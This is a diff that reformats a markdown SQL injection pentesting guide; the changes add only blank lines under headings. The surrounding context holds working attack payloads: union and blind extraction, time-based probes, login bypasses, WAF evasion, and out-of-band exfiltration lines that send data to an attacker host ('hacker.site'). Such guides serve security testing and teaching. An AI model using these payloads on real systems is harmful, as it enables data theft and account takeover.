@@ -9,11 +9,13 @@ toc:
 ---
 
 ## What is SQL injection?
+
 ---
 
 An **SQL injection** is a security flaw that allows attackers to **interfere with database queries** of an application. This vulnerability can enable attackers to **view**, **modify**, or **delete** data they shouldn't access, including information of other users or any data the application can access. Such actions may result in permanent changes to the application's functionality or content or even compromision of the server or denial of service.
 
 ## Entry point detection
+
 ---
 
 When a site appears to be **vulnerable to SQL injection (SQLi)** due to unusual server responses to SQLi-related inputs, the **first step** is to understand how to **inject data into the query without disrupting it**. This requires identifying the method to **escape from the current context** effectively. These are some useful examples:
@@ -38,6 +40,7 @@ _Note that if you can see error messages or you can spot differences when a quer
 <br>
 
 ### **Comments**
+
 ---
 
 ```sql
@@ -69,6 +72,7 @@ HQL does not support comments
 <br>
 
 ### Confirming with logical operations
+
 ---
 
 A reliable method to confirm an SQL injection vulnerability involves executing a **logical operation** and observing the expected outcomes. For instance, a GET parameter such as `?username=Peter` yielding identical content when modified to `?username=Peter' or '1'='1` indicates a SQL injection vulnerability.
@@ -89,6 +93,7 @@ This word-list was created to try to **confirm SQLinjections** in the proposed w
 <br>
 
 ### Confirming with Timing
+
 ---
 
 In some cases you **won't notice any change** on the page you are testing. Therefore, a good way to **discover blind SQL injections** is making the DB perform actions and will have an **impact on the time** the page need to load.\
@@ -121,6 +126,7 @@ In some cases the **sleep functions won't be allowed**. Then, instead of using t
 <br>
 
 ### Identifying Back-end
+
 ---
 
 The best way to identify the back-end is trying to execute functions of the different back-ends. You could use the _**sleep**_ **functions** of the previous section or these ones (table from [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
@@ -161,14 +167,17 @@ Also, if you have access to the output of the query, you could make it **print t
 <br>
 
 ### Identifying with PortSwigger
+
 ---
 
 ## Exploiting Union Based
+
 ---
 
 <br>
 
 ### Detecting number of columns
+
 ---
 
 If you can see the output of the query this is the best way to exploit it.\
@@ -178,6 +187,7 @@ Two methods are typically used for this purpose:
 <br>
 
 ### Order/Group by
+
 ---
 
 To determine the number of columns in a query, incrementally adjust the number used in **ORDER BY** or **GROUP BY** clauses until a false response is received. Despite the distinct functionalities of **GROUP BY** and **ORDER BY** within SQL, both can be utilized identically for ascertaining the query's column count.
@@ -201,6 +211,7 @@ To determine the number of columns in a query, incrementally adjust the number u
 <br>
 
 ### UNION SELECT
+
 ---
 
 Select more and more null values until the query is correct:
@@ -216,6 +227,7 @@ _You should use `null`values as in some cases the type of the columns of both si
 <br>
 
 ### Extract database names, table names and column names
+
 ---
 
 On the next examples we are going to retrieve the name of all the databases, the table name of a database, the column names of the table:
@@ -234,6 +246,7 @@ On the next examples we are going to retrieve the name of all the databases, the
 _There is a different way to discover this data on every different database, but it's always the same methodology._
 
 ## Exploiting Hidden Union Based
+
 ---
 
 When the output of a query is visible, but a union-based injection seems unachievable, it signifies the presence of a **hidden union-based injection**. This scenario often leads to a blind injection situation. To transform a blind injection into a union-based one, the execution query on the backend needs to be discerned.
@@ -245,6 +258,7 @@ Once the query has been extracted, it's necessary to tailor your payload to safe
 For more comprehensive insights, refer to the complete article available at [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).
 
 ## Exploiting Error based
+
 ---
 
 If for some reason you **cannot** see the **output** of the **query** but you can **see the error messages**, you can make this error messages to **ex-filtrate** data from the database.\
@@ -255,6 +269,7 @@ Following a similar flow as in the Union Based exploitation you could manage to 
 ```
 
 ## Exploiting Blind SQLi
+
 ---
 
 In this case you cannot see the results of the query or the errors, but you can **distinguished** when the query **return** a **true** or a **false** response because there are different contents on the page.\
@@ -265,6 +280,7 @@ In this case, you can abuse that behaviour to dump the database char by char:
 ```
 
 ## Exploiting Error Blind SQLi
+
 ---
 
 This is the **same case as before** but instead of distinguish between a true/false response from the query you can **distinguish between** an **error** in the SQL query or not (maybe because the HTTP server crashes). Therefore, in this case you can force an SQLerror each time you guess correctly the char:
@@ -274,6 +290,7 @@ AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
 ```
 
 ## Exploiting Time Based SQLi
+
 ---
 
 In this case there **isn't** any way to **distinguish** the **response** of the query based on the context of the page. But, you can make the page **take longer to load** if the guessed character is correct. We have already saw this technique in use before in order to [confirm a SQLi vuln](#confirming-with-timing).
@@ -283,6 +300,7 @@ In this case there **isn't** any way to **distinguish** the **response** of the 
 ```
 
 ## Stacked Queries
+
 ---
 
 You can use stacked queries to **execute multiple queries in succession**. Note that while the subsequent queries are executed, the **results** are **not returned to the application**. Hence this technique is primarily of use in relation to **blind vulnerabilities** where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
@@ -290,6 +308,7 @@ You can use stacked queries to **execute multiple queries in succession**. Note 
 **Oracle** doesn't support **stacked queries.** **MySQL, Microsoft** and **PostgreSQL** support them: `QUERY-1-HERE; QUERY-2-HERE`
 
 ## Out of band Exploitation
+
 ---
 
 If **no-other** exploitation method **worked**, you may try to make the **database ex-filtrate** the info to an **external host** controlled by you. For example, via DNS queries:
@@ -301,6 +320,7 @@ select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
 <br>
 
 ### Out of band data exfiltration via XXE
+
 ---
 
 ```sql
@@ -308,11 +328,13 @@ a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DO
 ```
 
 ## Automated Exploitation
+
 ---
 
 Check the [SQLMap Cheatsheet](sqlmap/index.html) to exploit a SQLi vulnerability with [**sqlmap**](https://github.com/sqlmapproject/sqlmap).
 
 ## Tech specific info
+
 ---
 
 We have already discussed all the ways to exploit a SQL Injection vulnerability. Find some more tricks database technology dependant in this book:
@@ -326,6 +348,7 @@ We have already discussed all the ways to exploit a SQL Injection vulnerability.
 Or you will find **a lot of tricks regarding: MySQL, PostgreSQL, Oracle, MSSQL, SQLite and HQL in** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 
 ## Authentication bypass
+
 ---
 
 List to try to bypass the login functionality:
@@ -333,6 +356,7 @@ List to try to bypass the login functionality:
 <br>
 
 ### Raw hash authentication Bypass
+
 ---
 
 ```sql
@@ -349,6 +373,7 @@ sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
 <br>
 
 ### Injected hash authentication Bypass
+
 ---
 
 ```sql
@@ -363,6 +388,7 @@ _(This payloads are also included in the big list mentioned at the beginning of 
 <br>
 
 ### GBK Authentication Bypass
+
 ---
 
 IF ' is being scaped you can use %A8%27, and when ' gets scaped it will be created: 0xA80x5c0x27 (_╘'_)
@@ -387,6 +413,7 @@ print r.text
 <br>
 
 ### Polyglot injection (multicontext)
+
 ---
 
 ```sql
@@ -394,11 +421,13 @@ SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
 ## Insert Statement
+
 ---
 
 <br>
 
 ### Modify password of existing object/user
+
 ---
 
 To do so you should try to **create a new object named as the "master object"** (probably **admin** in case of users) modifying something:
@@ -410,6 +439,7 @@ To do so you should try to **create a new object named as the "master object"** 
 <br>
 
 ### SQL Truncation Attack
+
 ---
 
 If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user **admin**, try to create a username called: "_admin \[30 spaces] a_" and any password.
@@ -423,6 +453,7 @@ _Note: This attack will no longer work as described above in latest MySQL instal
 <br>
 
 ### MySQL Insert time based checking
+
 ---
 
 Add as much `','',''` as you consider to exit the VALUES statement. If delay is executed, you have a SQLInjection.
@@ -434,6 +465,7 @@ name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
 <br>
 
 ### ON DUPLICATE KEY UPDATE
+
 ---
 
 The `ON DUPLICATE KEY UPDATE` clause in MySQL is utilized to specify actions for the database to take when an attempt is made to insert a row that would result in a duplicate value in a UNIQUE index or PRIMARY KEY. The following example demonstrates how this feature can be exploited to modify the password of an administrator account:
@@ -455,11 +487,13 @@ Here's how it works:
 <br>
 
 ### Extract information
+
 ---
 
 <br>
 
 ### Creating 2 accounts at the same time
+
 ---
 
 When trying to create a new user and username, password and email are needed:
@@ -474,6 +508,7 @@ A new user with username=otherUsername, password=otherPassword, email:FLAG will 
 <br>
 
 ### Using decimal or hexadecimal
+
 ---
 
 With this technique you can extract information creating only 1 account. It is important to note that you don't need to comment anything.
@@ -502,6 +537,7 @@ Using **hex** and **replace** (and **substr**):
 ```
 
 ## Routed SQL injection
+
 ---
 
 Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. ([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))
@@ -514,6 +550,7 @@ Example:
 ```
 
 ## WAF Bypass
+
 ---
 
 - [Initial bypasses from here](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)
@@ -521,6 +558,7 @@ Example:
 <br>
 
 ### No spaces bypass
+
 ---
 
 No Space (%20) - bypass using whitespace alternatives
@@ -549,6 +587,7 @@ No Whitespace - bypass using parenthesis
 <br>
 
 ### No commas bypass
+
 ---
 
 No Comma - bypass using OFFSET, FROM and JOIN
@@ -562,6 +601,7 @@ SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELE
 <br>
 
 ### Generic Bypasses
+
 ---
 
 Blacklist using keywords - bypass using uppercase/lowercase
@@ -585,6 +625,7 @@ WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())
 <br>
 
 ### Scientific Notation WAF bypass
+
 ---
 
 You can find a more in depth explaination of this trick in [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
@@ -599,7 +640,9 @@ Basically you can use the scientific notation in unexpected ways for the WAF to 
 <br>
 
 ### Bypass Column Names Restriction
+
 ---
+
 First of all, notice that if the **original query and the table where you want to extract the flag from have the same amount of columns** you might just do: `0 UNION SELECT * FROM flag`
 
 It’s possible to **access the third column of a table without using its name** using a query like the following: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, so in an sqlinjection this would looks like:
@@ -621,10 +664,13 @@ This trick was taken from [https://secgroup.github.io/2017/01/03/33c3ctf-writeup
 <br>
 
 ### WAF bypass suggester tools
+
 ---
+
 - [Atlas, Quick SQLMap Tamper Suggester](https://github.com/m4ll0k/Atlas)
 
 ## Other Guides
+
 ---
 
 - [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
@@ -633,7 +679,9 @@ This trick was taken from [https://secgroup.github.io/2017/01/03/33c3ctf-writeup
 <br>
 
 ### Auto_Wordlists
-----
+
+---
+
 - [Brute-Force Detection List](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt)
 
 ​
